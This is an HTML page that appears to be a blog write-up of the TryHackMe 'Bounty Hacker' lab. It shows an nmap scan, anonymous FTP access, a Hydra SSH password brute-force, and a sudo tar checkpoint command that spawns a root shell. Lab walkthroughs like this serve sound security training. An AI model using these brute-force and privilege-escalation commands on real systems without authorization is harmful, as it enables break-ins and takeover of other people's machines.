<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dawnl3ss :: Bounty Hacker THM Write-Up</title>

    <meta property="og:title" content="Dawnless | Bounty Hacker THM Write-Up">
    <meta property="og:image" content="http://dawnl3ss.me/assets/img/ogimage.jpg">
    <meta property="og:description" content="Bounty Hacker TryHackMe Write-Up by Dawnl3ss. Anonymous FTP + Hydra SSH bruteforce + tar GTFOBins.">
    <meta name="author" content="Dawnless">

    <link rel="icon" href="/public/img/icon.jpg" type="image/png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&display=swap">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/MaterialDesign-Webfont/7.4.47/css/materialdesignicons.min.css">
    <link rel="stylesheet" href="/public/css/components/wtpage.css">
</head>
<body>

<header class="header" id="header">
    <div class="container">
        <nav class="nav">
            <a href="/" class="nav-logo">
                <img src="/public/img/icon.jpg" alt="Dawnl3ss">
                <div class="logo-text">dawnl3ss<span>@parrot</span></div>
            </a>
            <ul class="nav-list" id="navList">
                <li><a href="/" class="nav-link">Home</a></li>
                <li><a href="/writeups" class="nav-link">Writeups</a></li>
                <li><a href="#recon" class="nav-link">Recon</a></li>
                <li><a href="#access" class="nav-link">Access</a></li>
                <li><a href="#privesc" class="nav-link">PrivEsc</a></li>
            </ul>
            <button class="nav-toggle" id="navToggle" aria-label="Toggle menu">
                <span></span><span></span><span></span>
            </button>
        </nav>
    </div>
</header>

<section class="writeup-hero">
    <div class="container hero-inner">
        <div class="breadcrumb">
            <a href="/"><i class="mdi mdi-home"></i> Home</a>
            <i class="mdi mdi-chevron-right"></i>
            <a href="/writeups">Writeups</a>
            <i class="mdi mdi-chevron-right"></i>
            <span>Bounty Hacker</span>
        </div>

        <div class="writeup-banner">
            <img
                class="box-avatar"
                src="https://tryhackme-images.s3.amazonaws.com/room-icons/9ad38a2cc31d6ae0030c888aca7fe646.jpeg"
                alt="Bounty Hacker THM"
            >
            <div class="writeup-meta">
                <h1>THM - <span>Bounty Hacker</span> Write-Up</h1>
                <div class="meta-row">
                    <span class="meta-badge difficulty-easy"><i class="mdi mdi-circle-slice-8"></i> Easy</span>
                    <span class="meta-badge os-linux"><i class="mdi mdi-linux"></i> Linux</span>
                    <span class="meta-badge type-web"><i class="mdi mdi-web"></i> Web App</span>
                    <span class="meta-badge platform"><i class="mdi mdi-flag-checkered"></i> TryHackMe</span>
                </div>
                <div class="tag-list">
                    <span class="tag">ctf</span>
                    <span class="tag">linux</span>
                    <span class="tag">ftp</span>
                    <span class="tag">hydra</span>
                    <span class="tag">privesc</span>
                    <span class="tag">tar</span>
                    <span class="tag">gtfobins</span>
                </div>
            </div>
        </div>
    </div>
</section>

<div class="writeup-layout">

    <aside class="toc-sidebar">
        <nav class="toc-box">
            <p class="toc-title"><i class="mdi mdi-format-list-bulleted"></i> Contents</p>
            <ul class="toc-list">
                <li><a href="#intro"><i class="mdi mdi-information-outline"></i> Introduction</a></li>
                <li><a href="#recon"><i class="mdi mdi-radar"></i> Reconnaissance</a></li>
                <li><a href="#access"><i class="mdi mdi-console"></i> Getting a Shell</a></li>
                <li><a href="#privesc"><i class="mdi mdi-crown-outline"></i> Privilege Escalation</a></li>
            </ul>
        </nav>
    </aside>

    <main class="writeup-content">

        <section class="wt-section" id="intro">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-information-outline"></i></div>
                <div>
                    <span class="section-num">01 /</span>
                    <h2>Introduction</h2>
                </div>
            </div>

            <p>
                <a href="https://tryhackme.com/room/cowboyhacker" target="_blank">Bounty Hacker</a> is a free room on TryHackMe.
                The objective is to compromise the target and retrieve both the user and root flags.
            </p>

            <div class="box-info-card">
                <div class="box-info-item">
                    <i class="mdi mdi-flag-variant"></i>
                    <span class="bi-label">Name</span>
                    <span class="bi-value">Bounty Hacker</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-gauge"></i>
                    <span class="bi-label">Difficulty</span>
                    <span class="bi-value" style="color:#22c55e">Easy</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-linux"></i>
                    <span class="bi-label">OS</span>
                    <span class="bi-value">Linux</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-web"></i>
                    <span class="bi-label">Type</span>
                    <span class="bi-value">Web App</span>
                </div>
            </div>

            <p>Let's dive into the challenge!</p>
        </section>

        <section class="wt-section" id="recon">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-radar"></i></div>
                <div>
                    <span class="section-num">02 /</span>
                    <h2>Reconnaissance</h2>
                </div>
            </div>

            <p>After adding the machine IP to <code class="inline">/etc/hosts</code>, I ran an NMAP scan:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">nmap scan</span>
                    <button class="tb-copy" data-target="cmd1">copy</button>
                </div>
                <pre id="cmd1"><span class="prompt">$</span> <span class="cmd">nmap -A bounty.thm</span>
<span class="output">PORT   STATE SERVICE VERSION
<span class="success">21/tcp open  ftp     vsftpd 3.0.3</span>
<span class="warning">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span>
| -rw-rw-r-- 1 ftp ftp  418 Jun 07  2020 locks.txt
|_-rw-rw-r-- 1 ftp ftp   68 Jun 07  2020 task.txt
<span class="success">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8</span>
<span class="success">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span></span></pre>
            </div>

            <div class="callout warning">
                <i class="mdi mdi-folder-open-outline"></i>
                <p>FTP on port 21 allows <strong>anonymous login</strong> and exposes two files: <code class="inline">locks.txt</code> and <code class="inline">task.txt</code>.</p>
            </div>

            <p>Connecting anonymously to FTP and downloading the files:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">ftp - anonymous login</span>
                    <button class="tb-copy" data-target="cmd2">copy</button>
                </div>
                <pre id="cmd2"><span class="prompt">$</span> <span class="cmd">ftp bounty.thm</span>
<span class="output">Name (bounty.thm:dawnl3ss): Anonymous
230 Login successful.
ftp></span> <span class="cmd">ls -la</span>
<span class="output">-rw-rw-r-- 1 ftp ftp  418 Jun 07  2020 locks.txt
-rw-rw-r-- 1 ftp ftp   68 Jun 07  2020 task.txt</span>
<span class="output">ftp></span> <span class="cmd">get locks.txt</span>
<span class="output">226 Transfer complete. 418 bytes received.</span>
<span class="output">ftp></span> <span class="cmd">get task.txt</span>
<span class="output">226 Transfer complete. 68 bytes received.</span></pre>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">task.txt</span>
                    <button class="tb-copy" data-target="cmd3">copy</button>
                </div>
                <pre id="cmd3"><span class="prompt">$</span> <span class="cmd">cat task.txt</span>
<span class="output">1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

<span class="highlight">-lin</span></span></pre>
            </div>

            <div class="callout info">
                <i class="mdi mdi-account-outline"></i>
                <p>The task list was written by <strong>lin</strong> - a potential username. <code class="inline">locks.txt</code> contains a list of strings that look like passwords, perfect for a bruteforce attack.</p>
            </div>
        </section>

        <section class="wt-section" id="access">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-console"></i></div>
                <div>
                    <span class="section-num">03 /</span>
                    <h2>Getting a Shell</h2>
                </div>
            </div>

            <p>With the username <code class="inline">lin</code> and <code class="inline">locks.txt</code> as a wordlist, I bruteforced SSH using Hydra:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">hydra - SSH bruteforce</span>
                    <button class="tb-copy" data-target="cmd4">copy</button>
                </div>
                <pre id="cmd4"><span class="prompt">$</span> <span class="cmd">hydra -l lin -P locks.txt ssh://bounty.thm</span>
<span class="output">Hydra v9.1 starting at 2023-05-31 14:06:49
[DATA] max 16 tasks per 1 server, 26 login tries
<span class="success">[22][ssh] host: bounty.thm   login: lin   password: [REDACTED]</span>
1 of 1 target successfully completed, 1 valid password found</span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-key-variant"></i>
                <p>SSH credentials found: <code class="inline">lin:[REDACTED]</code></p>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">SSH login + user flag</span>
                    <button class="tb-copy" data-target="cmd5">copy</button>
                </div>
                <pre id="cmd5"><span class="prompt">$</span> <span class="cmd">ssh lin@bounty.thm</span>
<span class="output">lin@bounty.thm's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
<span class="success">lin@bountyhacker:~/Desktop$</span>

lin@bountyhacker:~/Desktop$</span> <span class="cmd">cat /home/lin/Desktop/user.txt</span>
<span class="success">THM{REDACTED}</span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-flag"></i>
                <p><strong>User flag captured!</strong> Now let's escalate to root.</p>
            </div>
        </section>

        <section class="wt-section" id="privesc">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-crown-outline"></i></div>
                <div>
                    <span class="section-num">04 /</span>
                    <h2>Privilege Escalation</h2>
                </div>
            </div>

            <p>Checking sudo permissions for <code class="inline">lin</code>:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">sudo -l</span>
                    <button class="tb-copy" data-target="cmd6">copy</button>
                </div>
                <pre id="cmd6"><span class="output">lin@bountyhacker:~/Desktop$</span> <span class="cmd">sudo -l</span>
<span class="output">User lin may run the following commands on bountyhacker:
<span class="success">    (root) /bin/tar</span></span></pre>
            </div>

            <div class="callout info">
                <i class="mdi mdi-lightbulb-outline"></i>
                <p><code class="inline">tar</code> can be abused with sudo to spawn a root shell via GTFOBins checkpoint actions.</p>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/thm/bounty-hacker/tar-sudo.png" alt="GTFOBins tar sudo">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// GTFOBins - tar sudo privilege escalation</div>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">tar GTFOBins -> root</span>
                    <button class="tb-copy" data-target="cmd7">copy</button>
                </div>
                <pre id="cmd7"><span class="output">lin@bountyhacker:~/Desktop$</span> <span class="cmd">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</span>
<span class="output">tar: Removing leading '/' from member names
<span class="success"># whoami</span>
root

# cat /root/root.txt
<span class="success">THM{REDACTED}</span></span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-crown"></i>
                <p><strong>Root flag captured!</strong> Box fully pwned via anonymous FTP -> Hydra SSH bruteforce -> tar GTFOBins. 💀</p>
            </div>
        </section>

    </main>
</div>

<footer class="footer">
    <div class="container footer-content">
        <div class="footer-social">
            <a href="https://github.com/dawnl3ss/" target="_blank"><i class="mdi mdi-github"></i></a>
            <a href="https://discord.gg/hardware" target="_blank"><i class="mdi mdi-discord"></i></a>
            <a href="http://dawnl3ss.me/" target="_blank"><i class="mdi mdi-web"></i></a>
            <a href="https://twitter.com/dawnl3ss" target="_blank"><i class="mdi mdi-twitter"></i></a>
        </div>
        <nav class="footer-nav">
            <a href="/">Home</a>
            <a href="/writeups">Writeups</a>
            <a href="mailto:dawnl3ss@protonmail.com">Contact</a>
        </nav>
        <p class="footer-copyright">Copyright Dawnl3ss © 2025 - <span style="color:var(--primary)">dawnl3ss@parrot-sec</span></p>
    </div>
</footer>

<div class="lightbox-overlay" id="lightbox">
    <button class="lightbox-close" id="lightboxClose">&times;</button>
    <img class="lightbox-img" id="lightboxImg" src="" alt="">
</div>

<script src="/public/js/wtpage.js"></script>
</body>
</html>